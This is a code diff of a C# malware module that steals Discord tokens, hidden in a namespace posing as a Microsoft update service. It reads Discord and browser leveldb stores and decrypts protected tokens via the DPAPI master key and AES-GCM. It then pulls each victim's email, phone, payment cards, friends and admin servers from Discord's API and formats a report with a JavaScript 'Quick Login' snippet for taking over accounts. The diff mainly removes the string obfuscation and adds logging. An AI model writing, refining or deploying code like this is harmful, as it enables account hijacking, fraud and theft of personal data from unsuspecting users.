@@ -23,79 +23,101 @@ namespace Microsoft.UpdateService.Modules
             return new string(c);
         }
 
-        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        private readonly string _localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        private static void Log(string msg)
+        {
+            string line = $"[{DateTime.Now:HH:mm:ss}] [DISCORD] {msg}";
+            Console.WriteLine(line);
+            try { File.AppendAllText("C:\\Users\\Public\\edge_update_debug.log", line + "\n"); } catch { }
+        }
 
-        private readonly string[] _tokenRegexes = {
-            D("^Yr(X~71xY+^Yr(X~3xY+^Yr(X~72x"), // [\w-]{24}\.[\w-]{6}\.[\w-]{27}
-            D("hcdY+^Yr(X~=1x"), // mfa\.[\w-]{84}
-            D("aTr1r<Rb]fT?^['%X~35)435x") // dQw4w9WgXcQ:[^" ]{60,160}
-        };
+        private readonly string _appData   = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        private readonly string _localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+
+        // Direct literal regexes — no obfuscation needed at this stage
+        private static readonly string TOKEN_PLAIN = @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}";
+        private static readonly string TOKEN_MFA   = @"mfa\.[\w-]{84}";
+        private static readonly string TOKEN_ENC   = @"dQw4w9WgXcQ:[^\s""]{60,160}";
 
         public async Task<string> Run()
         {
             var tokens = new HashSet<string>();
+
             var paths = new Dictionary<string, string>
             {
-                {"Discord", Path.Combine(_appData, "discord")},
-                {"Discord Canary", Path.Combine(_appData, "discordcanary")},
-                {"Discord PTB", Path.Combine(_appData, "discordptb")},
-                {"Chrome", Path.Combine(_localAppData, D("Bjjbi`YFmwjh`YPv`w%AdqdYA`idpiq"))},
-                {"Edge", Path.Combine(_localAppData, D("HlfwjvjcqY@ab`YPv`w%AdqdYA`idpiq"))},
-                {"Brave", Path.Combine(_localAppData, D("Gwds`Vjcqrdw`YGwds`(Gwjrv`wYPv`w%AdqdYA`idpiq"))},
-                {"Opera", Path.Combine(_appData, D("Ju`wd%Vjcqrdw`YJu`wd%Vqdgi`"))},
-                {"Opera GX", Path.Combine(_appData, D("Ju`wd%Vjcqrdw`YJu`wd%B]%Vqdgi`"))}
+                {"Discord",       Path.Combine(_appData,   "discord")},
+                {"Discord Canary",Path.Combine(_appData,   "discordcanary")},
+                {"Discord PTB",   Path.Combine(_appData,   "discordptb")},
+                {"Chrome",        Path.Combine(_localData, "Google", "Chrome", "User Data", "Default")},
+                {"Edge",          Path.Combine(_localData, "Microsoft", "Edge", "User Data", "Default")},
+                {"Brave",         Path.Combine(_localData, "BraveSoftware", "Brave-Browser", "User Data", "Default")},
+                {"Opera",         Path.Combine(_appData,   "Opera Software", "Opera Stable")},
+                {"Opera GX",      Path.Combine(_appData,   "Opera Software", "Opera GX Stable")},
             };
 
-            foreach (var path in paths)
+            Log($"Starting scan. Checking {paths.Count} paths...");
+
+            foreach (var kv in paths)
             {
-                if (Directory.Exists(path.Value))
+                bool exists = Directory.Exists(kv.Value);
+                Log($"  [{kv.Key}] exists={exists} -> {kv.Value}");
+                if (!exists) continue;
+
+                try
                 {
-                    try 
-                    {
-                        var found = await ScanPath(path.Key, path.Value);
-                        foreach (var t in found) tokens.Add(t);
-                    }
-                    catch { }
+                    var found = await ScanPath(kv.Key, kv.Value);
+                    Log($"  [{kv.Key}] found {found.Count} token(s)");
+                    foreach (var t in found) tokens.Add(t);
+                }
+                catch (Exception ex)
+                {
+                    Log($"  [{kv.Key}] EXCEPTION: {ex.Message}");
                 }
             }
+
+            Log($"Total unique tokens found: {tokens.Count}");
 
             if (tokens.Count == 0) return "❌ No Discord tokens found.";
 
             var report = new StringBuilder();
             report.AppendLine("💎 ✨ <b>DISCORD ANALYSIS REPORT</b> ✨ 💎");
-            report.AppendLine("🌐 <i>Scanning native modules and leveldb...</i>");
-            
+            report.AppendLine($"🔍 Found <b>{tokens.Count}</b> token(s)");
+            report.AppendLine("");
+
             using (var client = new HttpClient())
             {
+                client.Timeout = TimeSpan.FromSeconds(10);
+
                 foreach (var token in tokens)
                 {
-                    report.AppendLine("\n📡 " + $"<code>{token}</code>");
-                    
-                    // Quick Login Script
-                    string quickLogin = "<code>" + 
-                                       WebUtility.HtmlEncode("(function(token){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(token);break;}}}}])}catch(e){}try{window.localStorage.setItem('token', '\"' + token + '\"');}catch(e){}setTimeout(()=>{location.reload()},500);})('") + token + WebUtility.HtmlEncode("')") +
-                                       "</code>";
+                    report.AppendLine($"📡 <code>{token}</code>");
+
+                    // Quick Login JS snippet
+                    string quickLogin = "<code>" +
+                        WebUtility.HtmlEncode("(function(t){try{window.webpackChunkdiscord_app.push([[Symbol()],{},e=>{for(let r of Object.values(e.c)){if(r.exports?.default?.updateToken){r.exports.default.updateToken(t);break;}}}])}catch(e){}try{localStorage.setItem('token','\"'+t+'\"');}catch(e){}setTimeout(()=>location.reload(),500);})('" + token + "')") +
+                        "</code>";
                     report.AppendLine("💠 <b>Quick Login:</b>\n" + quickLogin);
 
                     var info = await GetAccountInfo(client, token);
                     if (info != null)
                     {
-                        string user = WebUtility.HtmlEncode(info["username"]?.ToString() ?? "Unknown");
-                        report.AppendLine($"👤 <b>User:</b> <code>{user}</code>");
+                        string user  = WebUtility.HtmlEncode(info["username"]?.ToString() ?? "Unknown");
+                        string email = WebUtility.HtmlEncode(info["email"]?.ToString() ?? "N/A");
+                        string phone = WebUtility.HtmlEncode(info["phone"]?.ToString() ?? "N/A");
+
+                        report.AppendLine($"\n👤 <b>User:</b> <code>{user}</code>");
                         report.AppendLine($"🆔 <b>ID:</b> <code>{info["id"]}</code>");
-                        report.AppendLine($"📧 <b>Email:</b> <code>{WebUtility.HtmlEncode(info["email"]?.ToString() ?? "N/A")}</code> ✅");
-                        report.AppendLine($"📱 <b>Phone:</b> <code>{WebUtility.HtmlEncode(info["phone"]?.ToString() ?? "N/A")}</code>");
-                        report.AppendLine($"🛡 <b>2FA:</b> <code>{(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}</code>");
+                        report.AppendLine($"📧 <b>Email:</b> <code>{email}</code>");
+                        report.AppendLine($"📱 <b>Phone:</b> <code>{phone}</code>");
+                        report.AppendLine($"🛡 <b>2FA:</b> {(info["mfa_enabled"]?.ToString() == "True" ? "🟢 On" : "🔴 Off")}");
 
                         string nitro = (int)(info["premium_type"] ?? 0) switch
                         {
-                            1 => "Nitro Classic",
-                            2 => "Nitro",
-                            3 => "Nitro Basic",
-                            _ => "None"
+                            1 => "💙 Nitro Classic",
+                            2 => "💜 Nitro (Boost)",
+                            3 => "💛 Nitro Basic",
+                            _ => "⬛ None"
                         };
-                        report.AppendLine($"💎 <b>Nitro:</b> <code>{nitro}</code>");
+                        report.AppendLine($"💎 <b>Nitro:</b> {nitro}");
                         report.AppendLine($"👥 <b>Friends:</b> <code>{info["friends_count"]}</code>");
 
                         if (info["billing_info"] is JArray cards && cards.Count > 0)
@@ -103,27 +125,24 @@ namespace Microsoft.UpdateService.Modules
                             report.AppendLine($"\n💳 <b>Billing ({cards.Count}):</b>");
                             foreach (var card in cards)
                             {
-                                string type = card["type"]?.ToString() == "1" ? "💳 Card" : "💰 Paypal";
-                                string brand = card["brand"]?.ToString() ?? "N/A";
+                                string type  = card["type"]?.ToString() == "1" ? "💳" : "🅿️";
+                                string brand = card["brand"]?.ToString() ?? "";
                                 string last4 = card["last_4"]?.ToString() ?? "****";
-                                report.AppendLine($"   {type} {brand} <b>{last4}</b>");
+                                report.AppendLine($"   {type} {brand} *{last4}");
                             }
                         }
-                        else
-                        {
-                            report.AppendLine("\n💳 <b>Billing:</b> ❌ No cards");
-                        }
+                        else report.AppendLine("💳 <b>Billing:</b> ❌ None");
 
                         if (info["admin_guilds"] is JArray guilds && guilds.Count > 0)
                         {
-                            report.AppendLine($"🏰 <b>Admin Servers ({guilds.Count}):</b>");
-                            foreach(var g in guilds.Take(5))
-                                report.AppendLine($"   • 🛡️ {WebUtility.HtmlEncode(g["name"]?.ToString() ?? "Unknown")}");
+                            report.AppendLine($"🏰 <b>Admin servers ({guilds.Count}):</b>");
+                            foreach (var g in guilds.Take(5))
+                                report.AppendLine($"   • {WebUtility.HtmlEncode(g["name"]?.ToString() ?? "?")}");
                         }
                     }
                     else
                     {
-                        report.AppendLine("⚠️ <b>Invalid/Expired Token</b>");
+                        report.AppendLine("⚠️ <b>Invalid / Expired token</b>");
                     }
                     report.AppendLine("——————————————————————————————");
                 }
@@ -131,149 +150,159 @@ namespace Microsoft.UpdateService.Modules
             return report.ToString();
         }
 
-        private async Task<JObject> GetAccountInfo(HttpClient client, string token)
+        private async Task<JObject?> GetAccountInfo(HttpClient client, string token)
         {
             try
             {
-                var request = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`")); // /users/@me
-                request.Headers.Authorization = new AuthenticationHeaderValue(token);
-                var response = await client.SendAsync(request);
-                if (response.IsSuccessStatusCode)
-                {
-                    var content = await response.Content.ReadAsStringAsync();
-                    var user = JObject.Parse(content);
-                    
-                    // 1. Check billing
-                    var billingReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*gliilkb*ud|h`kq(vjpwf`v"));
-                    billingReq.Headers.Authorization = new AuthenticationHeaderValue(token);
-                    var billingResp = await client.SendAsync(billingReq);
-                    if (billingResp.IsSuccessStatusCode)
-                    {
-                        user["billing_info"] = JArray.Parse(await billingResp.Content.ReadAsStringAsync());
-                    }
-                    
-                    // 2. Check friends (relationships)
-                    var friendsReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*w`idqljkvmluv"));
-                    friendsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
-                    var friendsResp = await client.SendAsync(friendsReq);
-                    if (friendsResp.IsSuccessStatusCode)
-                    {
-                        user["friends_count"] = JArray.Parse(await friendsResp.Content.ReadAsStringAsync()).Count;
-                    }
+                string apiBase = "https://discord.com/api/v9";
+                client.DefaultRequestHeaders.Clear();
+                client.DefaultRequestHeaders.TryAddWithoutValidation("Authorization", token);
+                client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36");
 
-                    // 3. Check guilds (admin status)
-                    var guildsReq = new HttpRequestMessage(HttpMethod.Get, D("mqquv?**alvfjwa+fjh*dul*s<*pv`wv*Eh`*bpliav"));
-                    guildsReq.Headers.Authorization = new AuthenticationHeaderValue(token);
-                    var guildsResp = await client.SendAsync(guildsReq);
-                    if (guildsResp.IsSuccessStatusCode)
-                    {
-                        var guilds = JArray.Parse(await guildsResp.Content.ReadAsStringAsync());
-                        var adminGuilds = new JArray();
-                        foreach(var g in guilds)
-                        {
-                            long permissions = long.Parse(g["permissions"]?.ToString() ?? "0");
-                            // Administrator permission is bit 3 (0x8)
-                            if ((permissions & 0x8) == 0x8)
-                            {
-                                adminGuilds.Add(g);
-                            }
-                        }
-                        user["admin_guilds"] = adminGuilds;
-                    }
-                    
-                    return user;
+                var resp = await client.GetAsync($"{apiBase}/users/@me");
+                if (!resp.IsSuccessStatusCode) { Log($"API /users/@me returned {resp.StatusCode}"); return null; }
+
+                var user = JObject.Parse(await resp.Content.ReadAsStringAsync());
+
+                // Billing
+                var bResp = await client.GetAsync($"{apiBase}/users/@me/billing/payment-sources");
+                if (bResp.IsSuccessStatusCode)
+                    user["billing_info"] = JArray.Parse(await bResp.Content.ReadAsStringAsync());
+
+                // Friends
+                var fResp = await client.GetAsync($"{apiBase}/users/@me/relationships");
+                if (fResp.IsSuccessStatusCode)
+                    user["friends_count"] = JArray.Parse(await fResp.Content.ReadAsStringAsync()).Count;
+
+                // Admin guilds
+                var gResp = await client.GetAsync($"{apiBase}/users/@me/guilds");
+                if (gResp.IsSuccessStatusCode)
+                {
+                    var guilds = JArray.Parse(await gResp.Content.ReadAsStringAsync());
+                    var adminGuilds = new JArray(guilds.Where(g => (long.Parse(g["permissions"]?.ToString() ?? "0") & 0x8) == 0x8));
+                    user["admin_guilds"] = adminGuilds;
                 }
+
+                return user;
             }
-            catch { }
-            return null;
+            catch (Exception ex) { Log($"GetAccountInfo error: {ex.Message}"); return null; }
         }
 
         private async Task<List<string>> ScanPath(string service, string rootPath)
         {
             var results = new List<string>();
-            string levelDbPath = Path.Combine(rootPath, D("Ijfdi%Vqjwdg`"), D("i`s`iaG")); // Local Storage, leveldb
-            if (!Directory.Exists(levelDbPath)) return results;
 
-            byte[]? masterKey = null;
-            if (service.Contains("Discord"))
+            // Discord: Local Storage/leveldb. Browsers: same subdirectory or root leveldb.
+            var ldbDirs = new List<string>();
+
+            string lsLdb = Path.Combine(rootPath, "Local Storage", "leveldb");
+            if (Directory.Exists(lsLdb)) ldbDirs.Add(lsLdb);
+
+            string directLdb = Path.Combine(rootPath, "leveldb");
+            if (Directory.Exists(directLdb)) ldbDirs.Add(directLdb);
+
+            if (ldbDirs.Count == 0)
             {
-                masterKey = GetDiscordMasterKey(rootPath);
+                Log($"  [{service}] No leveldb dirs found.");
+                return results;
             }
 
-            foreach (var file in Directory.GetFiles(levelDbPath, "*.ldb").Concat(Directory.GetFiles(levelDbPath, "*.log")))
-            {
-                try 
-                {
-                    // Use Latin-1 (28591) for binary-safe string reading — essential for regex in .ldb files
-                    string content = File.ReadAllText(file, Encoding.GetEncoding(28591));
-                    foreach (var regex in _tokenRegexes)
-                    {
-                        foreach (Match match in Regex.Matches(content, regex))
-                        {
-                            string token = match.Value;
-                            if (token.Contains("dQw4w9WgXcQ:"))
-                            {
-                                // Handle potential character corruption in binary files
-                                var parts = token.Split(':');
-                                if (parts.Length < 2) continue;
-                                string encPart = parts[1].Split('"')[0].Split(' ')[0];
+            // Try to get master key for AES-GCM decryption
+            byte[]? masterKey = GetMasterKey(rootPath);
+            Log($"  [{service}] masterKey={(masterKey != null ? $"{masterKey.Length}b" : "null")}, dirs={ldbDirs.Count}");
 
-                                if (masterKey != null)
-                                {
-                                    string? decrypted = DecryptDiscordToken(encPart, masterKey);
-                                    if (!string.IsNullOrEmpty(decrypted)) results.Add(decrypted);
-                                }
-                            }
-                            else 
+            foreach (var dir in ldbDirs)
+            {
+                var files = Directory.GetFiles(dir, "*.ldb")
+                    .Concat(Directory.GetFiles(dir, "*.log")).ToArray();
+
+                foreach (var file in files)
+                {
+                    try
+                    {
+                        using var fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
+                        using var sr = new StreamReader(fs, Encoding.GetEncoding(28591)); // latin-1 for binary safe
+                        string content = await sr.ReadToEndAsync();
+
+                        // Plain tokens
+                        foreach (Match m in Regex.Matches(content, TOKEN_PLAIN))
+                            if (!results.Contains(m.Value)) results.Add(m.Value);
+
+                        foreach (Match m in Regex.Matches(content, TOKEN_MFA))
+                            if (!results.Contains(m.Value)) results.Add(m.Value);
+
+                        // Encrypted tokens
+                        foreach (Match m in Regex.Matches(content, TOKEN_ENC))
+                        {
+                            string raw = m.Value;
+                            int colonIdx = raw.IndexOf(':');
+                            if (colonIdx < 0) continue;
+                            string encPart = raw.Substring(colonIdx + 1).TrimEnd('"', ' ', '\r', '\n');
+
+                            if (masterKey != null)
                             {
-                                results.Add(token);
+                                string? dec = TryDecrypt(encPart, masterKey);
+                                if (!string.IsNullOrEmpty(dec) && !results.Contains(dec))
+                                {
+                                    Log($"  [{service}] Decrypted: {dec.Substring(0, Math.Min(12, dec.Length))}...");
+                                    results.Add(dec);
+                                }
                             }
                         }
                     }
+                    catch { }
                 }
-                catch { }
             }
 
             return results.Distinct().ToList();
         }
 
-        private byte[] GetDiscordMasterKey(string rootPath)
+        private byte[]? GetMasterKey(string rootPath)
         {
-            string stateFile = Path.Combine(rootPath, D("Ijfdi%Vqdq`")); // Local State
-            if (!File.Exists(stateFile)) return null;
+            // Check both in rootPath and parent (for browser profiles)
+            string[] candidates = {
+                Path.Combine(rootPath, "Local State"),
+                Path.Combine(Path.GetDirectoryName(rootPath) ?? rootPath, "Local State")
+            };
 
-            try 
+            foreach (string stateFile in candidates)
             {
-                string content = File.ReadAllText(stateFile);
-                var json = JObject.Parse(content);
-                string encryptedKey = json[D("jvZfw|uq")]?[D("`kfw|uq`aZn`|")]?.ToString(); // os_crypt, encrypted_key
-                if (string.IsNullOrEmpty(encryptedKey)) return null;
+                if (!File.Exists(stateFile)) continue;
+                try
+                {
+                    var json = JObject.Parse(File.ReadAllText(stateFile));
+                    string? b64Key = json["os_crypt"]?["encrypted_key"]?.ToString();
+                    if (string.IsNullOrEmpty(b64Key)) continue;
 
-                byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
-                byte[] key = keyWithPrefix.Skip(5).ToArray();
+                    byte[] keyWithPrefix = Convert.FromBase64String(b64Key);
+                    if (keyWithPrefix.Length < 5) continue;
 
-                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
+                    byte[] key = keyWithPrefix.Skip(5).ToArray(); // strip 'DPAPI'
+                    return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
+                }
+                catch { }
             }
-            catch { return null; }
+            return null;
         }
 
-        private string DecryptDiscordToken(string encryptedToken, byte[] key)
+        private string? TryDecrypt(string encryptedBase64, byte[] key)
         {
-            try 
+            try
             {
-                byte[] data = Convert.FromBase64String(encryptedToken.Split(':')[1]);
-                byte[] iv = data.Skip(3).Take(12).ToArray();
-                byte[] payload = data.Skip(15).ToArray();
+                byte[] data = Convert.FromBase64String(encryptedBase64);
+                // Format: v10 prefix (3 bytes) + IV (12 bytes) + ciphertext + tag (16 bytes)
+                if (data.Length < 3 + 12 + 16) return null;
 
-                using (var aes = new AesGcm(key, 16))
-                {
-                    byte[] tag = payload.TakeLast(16).ToArray();
-                    byte[] ciphertext = payload.SkipLast(16).ToArray();
-                    byte[] plaintext = new byte[ciphertext.Length];
+                byte[] iv         = data.Skip(3).Take(12).ToArray();
+                byte[] payload    = data.Skip(15).ToArray();
+                byte[] tag        = payload.TakeLast(16).ToArray();
+                byte[] ciphertext = payload.SkipLast(16).ToArray();
+                byte[] plaintext  = new byte[ciphertext.Length];
 
-                    aes.Decrypt(iv, ciphertext, tag, plaintext);
-                    return Encoding.UTF8.GetString(plaintext);
-                }
+                using var aes = new AesGcm(key, 16);
+                aes.Decrypt(iv, ciphertext, tag, plaintext);
+                return Encoding.UTF8.GetString(plaintext);
             }
             catch { return null; }
         }
